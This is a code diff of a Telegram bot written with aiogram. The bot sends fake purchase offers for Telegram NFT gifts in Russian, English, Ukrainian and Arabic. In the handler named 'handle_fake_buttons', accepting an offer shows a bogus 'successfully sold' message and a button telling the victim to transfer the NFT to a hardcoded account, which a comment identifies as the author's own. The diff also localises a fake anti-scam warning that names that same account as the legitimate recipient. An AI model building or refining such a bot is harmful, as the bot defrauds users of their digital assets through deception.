@@ -13,14 +13,14 @@ from aiogram.exceptions import TelegramBadRequest
 # --- НАСТРОЙКИ ИЗ СЕКРЕТОВ GITHUB ---
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 GIST_ID = os.getenv("GIST_ID")
-GIST_TOKEN = os.getenv("GIST_TOKEN") # ИСПОЛЬЗУЕМ НОВЫЙ ТОКЕН
+GIST_TOKEN = os.getenv("GIST_TOKEN")
 
 try:
     ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 except ValueError:
     ADMIN_ID = 0
 
-DEFAULT_TARGET = "Gifts_Replayer"
+DEFAULT_TARGET = "Gifts_Replayer" # <-- ВОЗВРАЩЕН ТВОЙ ЮЗЕРНЕЙМ
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -30,32 +30,36 @@ active_users = set()
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления звёзд.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления {symbol}.",
         "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
+        "alert": "⚠️ Внимание!\n\nПолучатель в этом сервисе:\n@{target_username}.\n\nЕсли вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать NFT"
     },
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive {symbol}.",
         "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
+        "alert": "⚠️ Attention!\n\nThe recipient in this service is:\n@{target_username}.\n\nIf you are asked to transfer the NFT directly to another user — do not send it. This could be a scam. Check the payment terms.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
         "btn_transfer": "Transfer NFT"
     },
     "ua": {
         "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування зірок.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування {symbol}.",
         "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
+        "alert": "⚠️ Увага!\n\nОтримувач у цьому сервісі:\n@{target_username}.\n\nЯкщо вас просять передати NFT безпосередньо іншому користувачу — не надсилайте його. Це може бути шахрайство. Перевіряйте умови оплати.",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
         "btn_transfer": "Передати NFT"
     },
     "ar": {
         "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام النجوم.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام {symbol}.",
         "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
+        "alert": "⚠️ انتباه!\n\nالمستلم في هذه الخدمة:\n@{target_username}.\n\nإذا طُلب منك تحويل NFT مباشرة إلى مستخدم آخر — فلا ترسله. قد يكون هذا احتيالاً. تحقق من شروط الدفع.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
         "btn_transfer": "نقل NFT"
@@ -283,17 +287,14 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
     if action == "accept":
         new_text = msg_data["success"].format(
-            link=link, pretty_name=pretty_name, target_username=target_username
+            link=link, pretty_name=pretty_name, target_username=target_username, symbol=symbol
         )
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
         ])
-        alert_text = (
-            "⚠️ Внимание!\n\n"
-            "Получатель в этом сервисе:\n"
-            f"@{target_username}.\n\n"
-            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-        )
+        
+        # ТЕПЕРЬ ТЕКСТ ОКНА БЕРЕТСЯ ИЗ СЛОВАРЯ ПЕРЕВОДОВ
+        alert_text = msg_data["alert"].format(target_username=target_username)
     else:
         new_text = msg_data["declined"].format(
             amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
